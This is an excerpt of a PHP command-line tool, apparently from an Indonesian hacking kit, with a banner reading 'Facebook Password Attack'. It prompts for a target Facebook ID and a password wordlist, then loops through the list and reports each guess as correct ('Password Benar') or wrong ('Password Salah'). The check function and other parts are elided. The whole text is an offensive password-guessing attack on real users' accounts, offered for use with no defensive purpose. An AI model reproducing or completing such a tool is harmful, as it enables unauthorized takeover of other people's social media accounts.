...
║╔╝║╔╣╠╣║
╚╝─╚╝╚╝╚╝
".$blue."Facebook ".$light_red."Password Attack
".$white."Author ".$light_red.": ".$white."ToolKit\n\n".$nc;
$file = $_SERVER[argv][1];
echo "$white Masukkan ".$light_blue."ID Target:$yellow ";
$user = trim(fgets(STDIN));
echo "$white Tulis ".$light_blue."password.txt:$yellow ";
...
if(!empty($user) && !empty($wordlist)) {
	...
	foreach($passlist as $password) {
		...
		if(check(urlencode($user), urlencode($pass))) {
			print $pass." => ".$green."Password Benar\n".$nc;
		} else {
			print $pass." => ".$red."Password Salah\n".$nc;
		}
	}
} else {
	print $banner;
